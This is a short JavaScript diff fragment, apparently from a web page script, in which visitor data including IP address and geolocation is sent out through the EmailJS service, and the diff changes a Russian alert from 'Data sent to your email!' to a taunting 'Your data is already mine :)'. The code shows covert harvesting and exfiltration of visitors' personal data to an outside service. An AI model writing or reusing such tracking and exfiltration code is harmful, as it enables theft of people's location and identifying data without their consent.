@@ -47,7 +47,7 @@
             emailjs.send("Hjikwe21782", "template_73zczgq", userData)
                 .then(function(response) {
                     console.log("Email sent successfully", response);
-                    alert('Данные отправлены на вашу почту!');
+                    alert('Твои данные уже у меня:)');
                     if (userData.location) {
                         markIpAsSent(userData.ip); // Помечаем IP как отправленный с геолокацией
                     }
